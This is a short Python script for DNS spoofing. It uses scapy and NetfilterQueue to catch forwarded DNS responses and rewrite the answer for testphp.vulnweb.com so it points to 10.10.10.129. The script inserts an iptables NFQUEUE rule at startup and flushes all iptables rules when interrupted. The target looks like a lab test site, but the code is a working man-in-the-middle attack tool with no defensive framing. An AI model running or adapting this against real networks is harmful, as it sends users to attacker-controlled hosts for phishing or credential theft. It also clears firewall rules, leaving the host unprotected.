# install this 1st "sudo apt-get install build-essential python-dev libnetfilter-queue-dev" ,
# "python3 -m pip install NetfilterQueue"

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy import *
from netfilterqueue import NetfilterQueue

dns_hosts = {
    b'testphp.vulnweb.com': "10.10.10.129"  # website and redirect ip
}


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        print("[+] Before : {}".format(qname.decode()))
        try:
            scapy_packet = modify_packet(scapy_packet)
        except Exception as e:
            print(e)
            pass
        packet.set_payload(bytes(scapy_packet))

    packet.accept()


def modify_packet(scapy_packet):
    qname = scapy_packet[DNSQR].qname
    if qname not in dns_hosts:
        print("[!] no modification required...")
        return scapy_packet
    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    scapy_packet[DNS].ancount = 1
    print("[+] after: {}".format(dns_hosts[qname]))
    del scapy_packet[IP].chksum
    del scapy_packet[IP].len
    del scapy_packet[UDP].chksum
    del scapy_packet[UDP].len
    return scapy_packet


QUEUE_NUM = 0

os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

nfq = NetfilterQueue()

try:
    nfq.bind(QUEUE_NUM, process_packet)
    nfq.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
